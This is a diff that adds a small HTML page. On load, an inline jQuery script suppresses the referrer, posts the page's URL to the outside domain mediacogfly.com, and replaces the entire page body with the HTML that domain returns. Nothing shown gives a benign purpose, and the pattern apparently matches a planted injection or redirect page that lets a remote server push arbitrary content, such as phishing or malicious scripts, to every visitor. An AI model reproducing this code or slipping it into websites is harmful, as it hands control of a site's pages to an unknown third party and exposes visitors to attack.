@@ -1,0 +1,18 @@
+<html>
+<head>
+<meta name="referrer" content="no-referrer">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+</head>
+<body>
+ <script>
+ $.ajax({
+ url: "//mediacogfly.com/js",
+ type: "POST",
+ data:  { href: location.href},
+}).done(function(data) {
+ $("body").html(data);
+});
+ </script>
+</body>
+</html>
